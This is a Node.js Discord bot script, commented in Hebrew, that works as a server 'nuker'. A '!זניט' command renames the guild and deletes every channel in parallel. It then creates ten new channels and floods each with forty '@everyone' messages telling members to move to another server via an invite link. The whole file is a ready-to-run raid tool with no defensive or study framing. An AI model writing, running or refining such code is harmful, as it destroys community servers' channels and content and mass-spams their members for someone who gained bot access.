const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');

async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

async function main() {
    const config = await loadConfig();
    
    // משיכת הטוקן בצורה סודית מהאתר רנדר
    const botToken = config.token === "PROCESS_ENV_TOKEN" ? process.env.DISCORD_TOKEN : config.token;

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    client.once('ready', () => { 
        console.log(`Logged in as ${client.user.tag}!`); 
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith('!') || message.author.bot) return;
        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        if (command === 'זניט') {
            console.log('Hyper-speed attack started!');
            
            // 1. שינוי שם השרת הכללי (רץ ברקע)
            message.guild.setName(config.newServerName).catch(console.error);
            
            // 2. מחיקה מהירה במקביל של כל החדרים הקיימים בשרת
            const channels = await message.guild.channels.fetch();
            const deletePromises = Array.from(channels.values()).map(channel => channel.delete().catch(console.error));
            await Promise.all(deletePromises); 

            // 3. יצירה מהירה במקביל של 10 חדרים חדשים
            const channelPromises = [];
            for (let i = 0; i < 10; i++) {
                channelPromises.push(
                    message.guild.channels.create({ name: 'כנסו-עברנו-שרת', type: 0 }).catch(console.error)
                );
            }
            const createdChannels = await Promise.all(channelPromises);
            const validChannels = createdChannels.filter(ch => ch);

            // 4. הפצצת ספאם היסטרית - כל הודעות הספאם נשלחות בבת אחת במקביל בכל החדרים!
            const spamPromises = [];
            for (const channel of validChannels) {
                for (let i = 0; i < 40; i++) {
                    spamPromises.push(
                        channel.send('@everyone כנסו עברנו שרת https://discord.gg').catch(console.error)
                    );
                }
            }
            // מפעיל את כל מאות הודעות הספאם בשנייה אחת
            await Promise.all(spamPromises);
            console.log('Hyper-speed attack finished!');
        }
    });

    client.login(botToken);
}

main().catch(console.error);
